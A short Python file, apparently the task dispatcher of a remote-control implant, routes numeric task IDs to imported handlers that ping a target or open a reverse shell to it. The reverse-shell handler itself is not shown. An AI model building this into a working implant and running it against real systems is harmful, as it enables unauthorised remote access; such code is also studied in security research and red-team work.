#
# task_id = "000" --- Error in processing the json payload
# task_id = "001" --- Perform a ping to target.
# task_id = "002" --- Reverse shell to target.

from handlers.ping import perform_task_ping
from handlers.reverse_shell import perform_task_reverse_shell

def select_task(task_id):
    print(type(task_id))
    print(task_id)
    if task_id == 0:
        print("Error in processing json payload")
    elif task_id == 1:
        perform_task_ping()
    elif task_id == 2:
        perform_task_reverse_shell()
    else:
        print("Error, incorrect task_id, could not be processed")